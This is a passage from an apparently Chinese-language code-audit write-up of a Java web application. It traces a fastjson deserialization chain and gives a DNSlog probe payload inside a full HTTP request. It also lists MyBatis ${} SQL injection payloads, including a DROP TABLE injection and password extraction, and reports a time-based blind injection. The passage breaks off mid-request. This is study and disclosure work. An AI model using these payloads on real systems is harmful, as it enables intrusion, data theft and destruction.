class="hljs-type">ObjectDeserializer</span> <span class="hljs-variable">deserializer</span> <span class="hljs-operator">=</span> config.getDeserializers().get(clazz);<br><span class="hljs-keyword">if</span>(deserializer != <span class="hljs-literal">null</span>)&#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">json</span> <span class="hljs-operator">=</span> JSON.toJSONString(object);<br>    <span class="hljs-keyword">return</span> (T) JSON.parseObject(json, clazz);<br>&#125;<br></code></pre></td></tr></table></figure><p><font style="color:rgb(51, 51, 51);">在执行反序列化的过程中，调用实例化的类，执行后续命令</font></p><p><font style="color:rgb(51, 51, 51);"></font></p><p>接下来应该找<strong>调用 StringUtil#getInfo 方法</strong>的地方</p><p>看了参考文章找到 <font style="color:rgb(51, 51, 51);">UserComponent</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201349681.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> List&lt;?&gt; getUserList(Map&lt;String, String&gt; map)<span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-comment">//接收到前端传的 Map&lt;String,String&gt;，包含 search </span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">search</span> <span class="hljs-operator">=</span> map.get(Constants.SEARCH);<br>    <span class="hljs-type">String</span> <span class="hljs-variable">userName</span> <span class="hljs-operator">=</span> StringUtil.getInfo(search, <span class="hljs-string">&quot;userName&quot;</span>);<br>    <span class="hljs-type">String</span> <span class="hljs-variable">loginName</span> <span class="hljs-operator">=</span> StringUtil.getInfo(search, <span class="hljs-string">&quot;loginName&quot;</span>);<br>    <span class="hljs-type">String</span> <span class="hljs-variable">order</span> <span class="hljs-operator">=</span> QueryUtils.order(map);<br>    <span class="hljs-type">String</span> <span class="hljs-variable">filter</span> <span class="hljs-operator">=</span> QueryUtils.filter(map);<br>    <span class="hljs-keyword">return</span> userService.select(userName, loginName, QueryUtils.offset(map), QueryUtils.rows(map));<br>&#125;<br></code></pre></td></tr></table></figure><p>找 getUserList 的调用地方，这时应该找的是控制器里的方法了</p><blockquote><p>几个踩坑的地方：</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201350863.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201350926.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201350041.png"></p><p>我们要注意，真正应该调用的是 <font style="color:#080808;background-color:#ffffff;">getUserList(Map&lt;String, String&gt; map)，而上面的都不是正确调用</font></p></blockquote><p>找到真正调用 <font style="color:#080808;background-color:#ffffff;">getUserList(Map&lt;String, String&gt; map) 的地方</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201351643.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//路径变量 &#123;apiName&#125; </span><br><span class="hljs-meta">@GetMapping(value = &quot;/&#123;apiName&#125;/list&quot;)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">getList</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable(&quot;apiName&quot;)</span> String apiName,</span><br><span class="hljs-params">                      <span class="hljs-meta">@RequestParam(value = Constants.PAGE_SIZE, required = false)</span> Integer pageSize,</span><br><span class="hljs-params">                      <span class="hljs-meta">@RequestParam(value = Constants.CURRENT_PAGE, required = false)</span> Integer currentPage,</span><br><span class="hljs-params">                      //search 可传入 payload</span><br><span class="hljs-params">                      <span class="hljs-meta">@RequestParam(value = Constants.SEARCH, required = false)</span> String search,</span><br><span class="hljs-params">                      HttpServletRequest request)</span><span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-comment">//参数全部放入 Map，进行后续处理</span><br>    Map&lt;String, String&gt; parameterMap = ParamUtils.requestToMap(request);<br>    parameterMap.put(Constants.SEARCH, search);<br>    <span class="hljs-type">PageQueryInfo</span> <span class="hljs-variable">queryInfo</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PageQueryInfo</span>();<br>    Map&lt;String, Object&gt; objectMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;String, Object&gt;();<br></code></pre></td></tr></table></figure><hr><p><strong>小结利用链：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(value = &quot;/&#123;apiName&#125;/list&quot;)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">getList</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable(&quot;apiName&quot;)</span> String apiName,</span><br><span class="hljs-params">                      <span class="hljs-meta">@RequestParam(value = Constants.PAGE_SIZE, required = false)</span> Integer pageSize,</span><br><span class="hljs-params">                      <span class="hljs-meta">@RequestParam(value = Constants.CURRENT_PAGE, required = false)</span> Integer currentPage,</span><br><span class="hljs-params">                      <span class="hljs-meta">@RequestParam(value = Constants.SEARCH, required = false)</span> String search,</span><br><span class="hljs-params">                      HttpServletRequest request)</span><span class="hljs-keyword">throws</span> Exception &#123;<br>-&gt;<br><span class="hljs-keyword">private</span> List&lt;?&gt; getUserList(Map&lt;String, String&gt; map)<span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">userName</span> <span class="hljs-operator">=</span> StringUtil.getInfo(search, <span class="hljs-string">&quot;userName&quot;</span>);<br>    <span class="hljs-type">String</span> <span class="hljs-variable">loginName</span> <span class="hljs-operator">=</span> StringUtil.getInfo(search, <span class="hljs-string">&quot;loginName&quot;</span>);<br>&#125;<br>-&gt;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">getInfo</span><span class="hljs-params">(String search, String key)</span>&#123;<br>-&gt;<br><span class="hljs-type">String</span> <span class="hljs-variable">userName</span> <span class="hljs-operator">=</span> StringUtil.getInfo(search, <span class="hljs-string">&quot;userName&quot;</span>);<br><span class="hljs-type">String</span> <span class="hljs-variable">loginName</span> <span class="hljs-operator">=</span> StringUtil.getInfo(search, <span class="hljs-string">&quot;loginName&quot;</span>);<br>-&gt;<br><span class="hljs-type">JSONObject</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> JSONObject.parseObject(search);<br>-&gt;<br><span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> parse(text);<br>-&gt;<br>turn <span class="hljs-title function_">parse</span><span class="hljs-params">(text, DEFAULT_PARSER_FEATURE)</span>;<br>-&gt;<br><span class="hljs-keyword">return</span> parse(text, ParserConfig.getGlobalInstance(), features);<br>-&gt;<br><span class="hljs-type">DefaultJSONParser</span> <span class="hljs-variable">parser</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultJSONParser</span>(text, config, features);<br><span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> parser.parse();<br>-&gt;<br><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">parse</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">return</span> parse(<span class="hljs-literal">null</span>);<br>&#125;<br>-&gt;<br><span class="hljs-keyword">return</span> parseObject(object, fieldName);<br>-&gt;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> Object <span class="hljs-title function_">parseObject</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Map object, Object fieldName)</span> &#123;<br>-&gt;<br>Class&lt;?&gt; clazz = config.checkAutoType(typeName, <span class="hljs-literal">null</span>, lexer.getFeatures());<br>-&gt;<br><span class="hljs-keyword">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass, <span class="hljs-type">int</span> features) &#123;<br>-&gt;<br>clazz = TypeUtils.loadClass(typeName, defaultClassLoader, <span class="hljs-literal">true</span>);<br>-&gt;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Class&lt;?&gt; loadClass(String className, ClassLoader classLoader, <span class="hljs-type">boolean</span> cache) <br>-&gt;<br><span class="hljs-type">ObjectDeserializer</span> <span class="hljs-variable">deserializer</span> <span class="hljs-operator">=</span> config.getDeserializers().get(clazz);<br><br></code></pre></td></tr></table></figure><h4 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h4><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.net.Inet4Address&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;xxx.dnslog.cn&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>@type：指定 fastjson 要实例化的类， val：这个类的某个字段值  </p><p><code>Inet4Address</code> 只能解析 IP&#x2F;域名，不能触发 LDAP 请求  </p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">user/list?search=%7B%22%40type%22%3A%22java.net.Inet4Address%22%2C%22val%22%3A%22ccne35.dnslog.cn%22%7D</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>172.28.192.1:8123<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201351506.png"></p><h4 id="断点调试："><a href="#断点调试：" class="headerlink" title="断点调试："></a>断点调试：</h4><p>调试过程基本和“分析链”中一致，</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201351332.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201351023.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201351524.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201351288.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201352184.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201352076.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201352144.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201352547.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201352250.png"></p><p><font style="color:rgb(34, 34, 38);"></font></p><blockquote><p><font style="color:rgb(34, 34, 38);">通过dnslog探测fastjson的几种方法（</font>java.net.Inet4Address、Inet6Address、InetSocketAddress，url）</p><p><a href="https://blog.csdn.net/Adminxe/article/details/105918000">https://blog.csdn.net/Adminxe/article/details/105918000</a></p></blockquote><h4 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java">HTTP GET 请求 ：/user/list?search=&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.net.Inet4Address&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;xxx.dnslog.cn&quot;</span>&#125;<br>-&gt;ResourceController.java<br><span class="hljs-title function_">getList</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable(&quot;apiName&quot;)</span> String apiName,</span><br><span class="hljs-params">                        <span class="hljs-meta">@RequestParam(value = Constants.PAGE_SIZE, required = false)</span> Integer pageSize,</span><br><span class="hljs-params">                        <span class="hljs-meta">@RequestParam(value = Constants.CURRENT_PAGE, required = false)</span> Integer currentPage,</span><br><span class="hljs-params">                        <span class="hljs-meta">@RequestParam(value = Constants.SEARCH, required = false)</span> String search,</span><br><span class="hljs-params">                        HttpServletRequest request)</span><br>-&gt;UserComponent.java<br>getUserList#getInfo(search)<br>-&gt;<br>JSONObject.parseObject(search)<br>-&gt;<br>DefaultJSONParser<br>-&gt;<br>parse <br>-&gt;<br>checkAutoType<br>-&gt;<br>loadClass<br>-&gt;<br>TypeUtils.loadClass<br>-&gt;<br>config.getDeserializers().get(clazz)<br>-&gt;<br>Inet4Address<br>-&gt;<br>MiscCodec#ObjectDeserializer<br>-&gt;<br><span class="hljs-keyword">return</span> InetAddress.getByName(strVal); <span class="hljs-comment">//将strVal作为主机名,获取其对应的ip，域名在此处被解析</span><br></code></pre></td></tr></table></figure><h3 id="2-2-log4j-（不存在）"><a href="#2-2-log4j-（不存在）" class="headerlink" title="2.2 log4j （不存在）"></a>2.2 log4j （不存在）</h3><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201353028.png"></p><p>并没有导入 log4j-core 包，单独的 log4j-to-slf4j  是不存在漏洞的</p><p><code>log4j-to-slf4j</code> 是一个 <strong>桥接器（bridge）</strong>，它把 Log4j 2 API 的调用转发到 SLF4J，由 SLF4J 来真正打印  </p><h3 id="2-3-MyBatis-CVE-2020-26945（不存在）"><a href="#2-3-MyBatis-CVE-2020-26945（不存在）" class="headerlink" title="2.3 MyBatis CVE-2020-26945（不存在）"></a>2.3 MyBatis <strong><font style="color:rgba(0, 0, 0, 0.85);">CVE-2020-26945（不存在）</font></strong></h3><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201353100.png"></p><h4 id="漏洞点分析："><a href="#漏洞点分析：" class="headerlink" title="漏洞点分析："></a>漏洞点分析：</h4><p><font style="color:rgb(51, 51, 51);">SerializedCache#deserialize()</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getObject</span><span class="hljs-params">(Object key)</span> &#123;<br>    <span class="hljs-comment">//从底层的 delegate（被代理的对象，一般是一个缓存或Map）中取值</span><br>    <span class="hljs-type">Object</span> <span class="hljs-variable">object</span> <span class="hljs-operator">=</span> delegate.getObject(key);<br>    <span class="hljs-comment">// 如果取到的值是 null(过期)，直接返回 null；</span><br>    <span class="hljs-comment">// 否则将取到的值强转为 byte[]，再调用 deserialize 方法反序列化，恢复成原来的对象</span><br>    <span class="hljs-comment">//deserialize((byte[]) object) 就是 RCE 的触发点了</span><br>    <span class="hljs-keyword">return</span> object == <span class="hljs-literal">null</span> ? <span class="hljs-literal">null</span> : deserialize((<span class="hljs-type">byte</span>[]) object);<br>&#125;<br></code></pre></td></tr></table></figure><p>跟进 delegate.getObject</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Cache</span> &#123;<br>    ...<br>    Object <span class="hljs-title function_">getObject</span><span class="hljs-params">(Object key)</span>;<br>    ...<br>&#125;<br></code></pre></td></tr></table></figure><p>getObject    ctrl+alt+左键 转到声明</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201353445.png"></p><p> 跟进到 ScheduledCache  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getObject</span><span class="hljs-params">(Object key)</span> &#123;<br>    <span class="hljs-comment">//clearWhenStale() 检查缓存是否“过期”</span><br>    <span class="hljs-keyword">return</span> clearWhenStale() ? <span class="hljs-literal">null</span> : delegate.getObject(key);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">clearWhenStale</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">if</span> (System.currentTimeMillis() - lastClear &gt; clearInterval) &#123;<br>        clear();<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a><font style="color:rgb(34, 34, 34);">利用条件</font></h4><ol><li><font style="color:rgb(53, 53, 53);">用户启用了二级缓存功能</font></li></ol><blockquote><p><font style="color:rgb(53, 53, 53);">二级缓存其实就是将查询的结果，放入缓存中，下次查询相同的条件时，直接从缓存中获取结果，降低sql服务器的压力</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201353146.png"></p></blockquote><ol start="2"><li><font style="color:rgb(53, 53, 53);">攻击者可以修改缓存的内容，替换为恶意反序列化数据</font></li><li><font style="color:rgb(53, 53, 53);">用户未设置JEP-290过滤，且没有任何防御反序列化攻击的措施</font></li></ol><blockquote><p><strong>JEP-290 是从 Java 9 开始引入的</strong>，在 Java 8 里 <strong>不存在全局或类级序列化过滤器</strong> 的机制  </p></blockquote><p><strong>由于找不到可修改的缓存内容，这部分就作为漏洞学习一遍，本系统不存在此漏洞</strong></p><h2 id="接下来的审计按照以下方向进行："><a href="#接下来的审计按照以下方向进行：" class="headerlink" title="接下来的审计按照以下方向进行："></a>接下来的审计按照以下方向进行：</h2><ol><li>SQL 注入</li><li><del>文件安全 （在翻找功能点过程中并没有发现有能上传&amp;读取文件的点）</del></li><li>身份验证&amp;鉴权 （LogCostFilter.java）</li><li>第三方组件&amp;依赖 （已分析）</li></ol><h2 id="3、Mybatis-SQL-注入"><a href="#3、Mybatis-SQL-注入" class="headerlink" title="3、Mybatis SQL 注入"></a>3、Mybatis SQL 注入</h2><p>Mybatis框架的sql注入关注<code>${}</code>：</p><p><code>${}</code>用于直接替换SQL语句中的占位符，而<code>#{}</code>用于预编译</p><ol><li>like模糊查询</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sql">xml模板：<br><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> username <span class="hljs-keyword">LIKE</span> <span class="hljs-string">&#x27;%$&#123;name&#125;%&#x27;</span><br><br><span class="hljs-keyword">sql</span>注入：<br><span class="hljs-string">&#x27; OR &#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;=&#x27;</span><span class="hljs-number">1</span><br><br>执行<span class="hljs-keyword">sql</span>:<br><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> username <span class="hljs-keyword">LIKE</span> <span class="hljs-string">&#x27;%%&#x27;</span> <span class="hljs-keyword">OR</span> <span class="hljs-string">&#x27;1&#x27;</span><span class="hljs-operator">=</span><span class="hljs-string">&#x27;1%&#x27;</span><br></code></pre></td></tr></table></figure><ol start="2"><li>动态列名 &#x2F; 表名</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sql">xml模板：<br><span class="hljs-keyword">SELECT</span> $&#123;<span class="hljs-keyword">column</span>&#125; <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> id <span class="hljs-operator">=</span> #&#123;id&#125;<br><br><span class="hljs-keyword">sql</span>注入：<br><span class="hljs-keyword">column</span> <span class="hljs-operator">=</span> &quot;username, password from users --&quot;<br><br>执行<span class="hljs-keyword">sql</span>:<br><span class="hljs-keyword">SELECT</span> username, password <span class="hljs-keyword">from</span> users <span class="hljs-comment">-- FROM users WHERE id = ?</span><br></code></pre></td></tr></table></figure><ol start="3"><li>Order By</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sql">xml模板：<br><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> $&#123;sortColumn&#125;<br><br><span class="hljs-keyword">sql</span>注入：<br>sortColumn <span class="hljs-operator">=</span> &quot;id; DROP TABLE users --&quot;<br><br>执行<span class="hljs-keyword">sql</span>:<br><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> id; <span class="hljs-keyword">DROP</span> <span class="hljs-keyword">TABLE</span> users <span class="hljs-comment">-- </span><br></code></pre></td></tr></table></figure><ol start="4"><li>IN</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sql">xml模板：<br><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> id <span class="hljs-keyword">IN</span> ($&#123;ids&#125;)<br><br><span class="hljs-keyword">sql</span>注入：<br>mapper.findByIds(&quot;1,2,3 OR 1=1&quot;);<br><br>执行<span class="hljs-keyword">sql</span>:<br><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> id <span class="hljs-keyword">IN</span> (<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-keyword">OR</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><h3 id="AccoutMapperEx-xml"><a href="#AccoutMapperEx-xml" class="headerlink" title="AccoutMapperEx.xml"></a>AccoutMapperEx.xml</h3><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201353446.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201354889.png"></p><p>接下来考虑Controller&#x2F;Service 中是否传入了 name 参数</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201354762.png"></p><p>跟进 <font style="color:#080808;background-color:#ffffff;">select，</font></p><p><font style="color:#080808;background-color:#ffffff;"> 从请求参数 map 中解析搜索条件  </font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201354110.png"></p><p>寻找调用 <font style="color:#080808;background-color:#ffffff;">getAccountList() 的位置</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201354842.png"></p><p>跟进 select</p><p> <font style="color:#080808;background-color:#ffffff;">select(String apiName, Map&lt;String, String&gt; parameterMap) 是</font>整个查询模块的统一入口  </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201354949.png"></p><p>继续跟进，</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201354239.png"></p><p>接下来去找对应的功能点，可以发现，在“基本资料”中都是查询接口，而现在我们需要的是“结算账户”的查询接口，其他的接口也应该存在sql注入，之后查看。</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201354668.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201355700.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201355478.png"></p><p>对“结算账户”的查询点抓包后，正好对应刚才源码中看到的几个参数“<font style="color:#080808;background-color:#ffffff;">name, serialNo, remark</font>”：</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201355029.png"></p><p>对 name 参数进行sql注入：</p><p>从结果来看时间盲注成功了</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs html">GET /account/list?search=%7B%22name%22%3A%221%22%2C%22serialNo%22%3A%222%22%2C%22remark%22%3A%223%22%7D&amp;currentPage=1&amp;pageSize=15 HTTP/1.1<br>Host: 169.254.252.28:8123<br>Accept: application/json, text/javascript, */*; q=0.01<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36<br>X-Requested-With: XMLHttpRequest<br>Referer: http://169.254.252.28:8123/pages/manage/account.html<br>Accept-Encoding: gzip, deflate<br>Accept-Language: zh-CN,zh;q=0.9<br>Cookie: JSESSIONID=A4E545CEF643F8473838EB799DB320AD; Hm_lvt_1cd9bcbaae133f03a6eb19da6579aaba=1755655005; HMACCOUNT=A245E83F95E74014; 